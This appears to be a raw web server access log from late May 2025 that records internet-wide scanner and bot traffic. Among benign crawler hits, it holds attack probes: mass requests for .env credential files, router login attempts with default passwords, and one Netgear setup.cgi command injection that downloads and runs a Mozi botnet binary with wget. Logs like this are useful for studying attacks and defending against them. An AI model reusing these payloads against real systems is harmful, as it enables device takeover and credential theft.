167.94.138.199 - - [26/May/2025:20:26:25 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
167.94.138.199 - - [26/May/2025:20:26:30 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.199 - - [26/May/2025:20:26:33 +0000] "\x16\x03\x01\x00\xF7\x01\x00\x00\xF3\x03\x03\xB5\xDD\x8B\x8F\x09\x1CV\xCC/\x82\x12\xB9\xADm>\xAE6\xC6}\x08\x88\x9CJP\x7F=D\xB0t|\x03\xD7 \xC6\xE2Dl\x03\x9F\xFA9\x00\x1A\x13f\x97\xC1\xDA\xD8\xA6\xE9\x98\xEC)\xE4\x86\x03s\xDB\x89\xB2/\xF2N\xBD\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
206.168.34.202 - - [26/May/2025:20:39:53 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.202 - - [26/May/2025:20:39:55 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.202 - - [26/May/2025:20:39:57 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
206.168.34.202 - - [26/May/2025:20:40:02 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.202 - - [26/May/2025:20:40:03 +0000] "\x16\x03\x01\x00\xF7\x01\x00\x00\xF3\x03\x03Y\xBA\xED\x9F\xCA\xDF\x01~c|#\xAD\xF9\x89\x1DZ\xB8}\xDFRj\x1F5;I\xBE\xCAm>\x0Bo\x91 \xA8\xAC\xAD\xD93\x01\x96b3\xCF\x0FH\xFB\x1A\x0B\x06=J\xC0\xCE\xCB>\x0B\xDBW\xBA\xBA\xAD\x98\x00\xB4~\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
78.153.140.93 - - [26/May/2025:20:48:55 +0000] "GET /.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [26/May/2025:20:48:56 +0000] "POST / HTTP/1.1" 405 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
80.82.77.202 - - [26/May/2025:21:05:10 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-"
185.218.84.7 - - [26/May/2025:21:21:07 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.218.86.52 - - [26/May/2025:21:26:59 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.206 - - [26/May/2025:21:29:05 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.25 - - [26/May/2025:21:43:24 +0000] "GET / HTTP/1.0" 200 47 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
147.93.131.117 - - [26/May/2025:21:43:27 +0000] "GET /app/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:27 +0000] "GET /backend/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:27 +0000] "GET /laravel/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:27 +0000] "GET /admin/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:27 +0000] "GET /api/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:29 +0000] "GET /v1/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:30 +0000] "GET /www/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:30 +0000] "GET /v2/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:30 +0000] "GET /config/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:31 +0000] "GET /html/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:31 +0000] "GET /storage/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:31 +0000] "GET /web/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:32 +0000] "GET /production/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:32 +0000] "GET /core/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:32 +0000] "GET /system/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:32 +0000] "GET /development/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:32 +0000] "GET /dev/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:32 +0000] "GET /api/v1/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:33 +0000] "GET /api/v2/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:33 +0000] "GET /test/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:33 +0000] "GET /app/config/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:34 +0000] "GET /staging/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:34 +0000] "GET /dashboard/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:35 +0000] "GET /panel/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:35 +0000] "GET /stage/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:36 +0000] "GET /main/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
147.93.131.117 - - [26/May/2025:21:43:36 +0000] "GET /site/.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
78.153.140.93 - - [26/May/2025:21:46:16 +0000] "GET /.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [26/May/2025:21:46:16 +0000] "POST / HTTP/1.1" 405 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
176.65.149.188 - - [26/May/2025:21:55:51 +0000] "GET / HTTP/1.1" 200 47 "-" "-"
204.76.203.212 - - [26/May/2025:22:12:24 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
167.94.146.52 - - [26/May/2025:22:26:46 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.52 - - [26/May/2025:22:26:47 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.52 - - [26/May/2025:22:26:48 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
167.94.146.52 - - [26/May/2025:22:26:51 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.52 - - [26/May/2025:22:26:52 +0000] "\x16\x03\x01\x00\xF7\x01\x00\x00\xF3\x03\x03\xF8\x13@\xE3\xB5i\xCB\x8B@" 400 157 "-" "-"
4.155.0.120 - - [26/May/2025:23:04:55 +0000] "GET / HTTP/1.0" 200 47 "-" "-"
204.76.203.206 - - [26/May/2025:23:06:19 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [26/May/2025:23:11:51 +0000] "GET /.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [26/May/2025:23:11:51 +0000] "POST / HTTP/1.1" 405 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
5.183.209.244 - - [26/May/2025:23:24:54 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
43.128.156.124 - - [26/May/2025:23:50:29 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
179.43.161.218 - - [27/May/2025:00:05:41 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.11.27 - - [27/May/2025:00:20:25 +0000] "GET / HTTP/1.1" 200 47 "-" "-"
204.76.203.212 - - [27/May/2025:00:22:08 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.218.84.7 - - [27/May/2025:00:22:16 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
43.155.27.244 - - [27/May/2025:00:44:28 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
68.69.186.106 - - [27/May/2025:00:46:40 +0000] "CONNECT www.google.com:443 HTTP/1.1" 400 157 "-" "-"
93.174.93.12 - - [27/May/2025:00:50:16 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-"
93.171.225.158 - - [27/May/2025:01:15:52 +0000] "GET / HTTP/1.1" 200 47 "-" "Hello-World/1.0"
93.171.225.158 - - [27/May/2025:01:15:52 +0000] "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 157 "-" "-"
5.183.209.244 - - [27/May/2025:01:16:09 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
176.65.148.250 - - [27/May/2025:01:17:22 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 207 "http://20.2.249.66:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
176.65.148.250 - - [27/May/2025:01:17:22 +0000] "" 400 0 "-" "-"
176.65.149.188 - - [27/May/2025:01:20:25 +0000] "GET / HTTP/1.1" 200 47 "-" "-"
117.215.63.215 - - [27/May/2025:01:21:18 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.215.63.215:60210/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 207 "-" "-"
204.76.203.206 - - [27/May/2025:01:21:54 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.11.27 - - [27/May/2025:01:24:31 +0000] "GET / HTTP/1.1" 200 47 "-" "-"
176.65.148.10 - - [27/May/2025:01:29:57 +0000] "GET / HTTP/1.1" 200 47 "-" "Hello World/1.0"
141.76.94.12 - - [27/May/2025:01:44:35 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0"
79.124.58.198 - - [27/May/2025:01:45:30 +0000] "\x16\x03\x01\x05\xA8\x01\x00\x05\xA4\x03\x034d$\xD7\x13\xA3\x84\xD8\x8F\x14C\xCD\x12\x82\x87yk;\x83(\x17w;\xB6\xC2\xBD\xFC7\xC4*\xBE\x9C j\xC5\xB6\xA3e\x98v\x85\xA8\xC7\xF2\x9D\xB2\x13k\xE1\x9B\xFD\xB0\x83\xBAq\x99\x06Uk\x1F\x93\xF4(\x0FO\x00\x1A\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
205.210.31.17 - - [27/May/2025:01:45:35 +0000] "GET / HTTP/1.1" 200 47 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
78.153.140.93 - - [27/May/2025:02:04:50 +0000] "GET /.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [27/May/2025:02:04:50 +0000] "POST / HTTP/1.1" 405 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.218.86.52 - - [27/May/2025:02:17:34 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
176.65.149.188 - - [27/May/2025:02:18:28 +0000] "GET / HTTP/1.1" 200 47 "-" "-"
152.53.248.175 - - [27/May/2025:02:21:48 +0000] "CONNECT www.google.com:443 HTTP/1.1" 400 157 "-" "-"
93.174.93.12 - - [27/May/2025:02:27:55 +0000] "GET / HTTP/1.0" 200 47 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/76.0.3809.81 Mobile/15E148 Safari/605.1"
36.73.186.3 - - [27/May/2025:02:31:39 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
79.124.58.198 - - [27/May/2025:02:37:54 +0000] "GET /geoserver HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
204.76.203.206 - - [27/May/2025:02:59:46 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.218.84.7 - - [27/May/2025:03:07:08 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.212 - - [27/May/2025:03:08:53 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
79.124.58.198 - - [27/May/2025:03:09:25 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
35.95.69.36 - - [27/May/2025:03:18:34 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
64.62.197.199 - - [27/May/2025:03:32:45 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x04\xF9\xF4cX{z\xD4q,\xB9I'K\x17\x8A\xD4\xB1\x0F\xE3\xA5\x8D\xC0\xAA\x98B\x1Ed\xAF\x03\xE0\x03\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
45.135.194.53 - - [27/May/2025:03:35:09 +0000] "GET / HTTP/1.1" 200 47 "-" "-"
104.234.115.66 - - [27/May/2025:03:38:00 +0000] "GET / HTTP/1.0" 200 47 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
104.234.115.66 - - [27/May/2025:03:38:20 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xD2\xA3y8\xD8\xD9/\x83\xCA\x1E1d\xEF\xCA\xDB(\x1C\xE4\xF8m\xC7\x96\x9D\xD8\x9D\xFD \xA7\xEC\xA1NM m\x96\x92[gH\xA6(\xC0\xF5N\xB6\xA6\xA8\xBF\xFB\xE2\xDE6v\xEB\x01-\x03jZ\x17}q\xEC\x0F\xBE\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
104.234.115.66 - - [27/May/2025:03:38:36 +0000] "GET / HTTP/1.1" 200 47 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
68.69.186.42 - - [27/May/2025:03:46:11 +0000] "CONNECT www.google.com:443 HTTP/1.1" 400 157 "-" "-"
104.234.115.66 - - [27/May/2025:03:47:33 +0000] "\x16\x03\x01\x00\xFA\x01\x00\x00\xF6\x03\x03\xF8IZz\x1Cf\x1B\xB7\xE7|5+\xBB\xC2\xC5l\xFA\xB4\xBC[ \xFE\x9B\xC5v\xC3\xA1\x93 \xEC\xBC\x93 \xF1\x19\xF8\xCF\xBF\xACQ)\x12[\x84Y\x0C\xB6\x1A\xA2\xE8\xEC\x0B" 400 157 "-" "-"
104.234.115.66 - - [27/May/2025:03:47:47 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
68.69.186.106 - - [27/May/2025:03:58:11 +0000] "CONNECT www.google.com:443 HTTP/1.1" 400 157 "-" "-"
88.214.25.125 - - [27/May/2025:04:12:39 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
88.214.25.121 - - [27/May/2025:04:14:41 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
175.107.2.173 - - [27/May/2025:04:34:28 +0000] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 207 "-" "-"
5.183.209.244 - - [27/May/2025:04:40:56 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
79.124.58.198 - - [27/May/2025:04:41:19 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
80.82.77.202 - - [27/May/2025:04:42:48 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-"
142.93.228.172 - - [27/May/2025:04:42:57 +0000] "GET /geoip/ HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
142.93.228.172 - - [27/May/2025:04:42:58 +0000] "GET /password.php HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
142.93.228.172 - - [27/May/2025:04:42:59 +0000] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03\x16\xB44U5H\x1C\x13\xC1\x88\xEB\x9B\x91/L+\xA4\x0F\xB9A\xA1>-\x92dy#\x1B\x87\x17?\x93\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
142.93.228.172 - - [27/May/2025:04:42:59 +0000] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03!\x0C\xFF\xF9\xD9\x8D\xB2\xBB\x0C\xC0\xE5\x90%\x88-\x88\xFE\xCE \x91\x0F\xD0\x02\xD7\x0F\x90\xC4@\x91\xE7\xC8\x9B\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
142.93.228.172 - - [27/May/2025:04:42:59 +0000] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03s\xC4\x95%\xD2\xF4q\x89\x19\x1Dg\xBDs\x17\xAF\xBC\x89\x97\xC4\xFB\x04\xFEq vu'\x952w\xDF\xBA\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
142.93.228.172 - - [27/May/2025:04:42:59 +0000] "GET /form.html HTTP/1.1" 404 207 "-" "curl/8.1.2"
142.93.228.172 - - [27/May/2025:04:43:00 +0000] "GET /upl.php HTTP/1.1" 404 207 "-" "Mozilla/5.0"
142.93.228.172 - - [27/May/2025:04:43:00 +0000] "GET /t4 HTTP/1.1" 404 207 "-" "Mozilla/5.0"
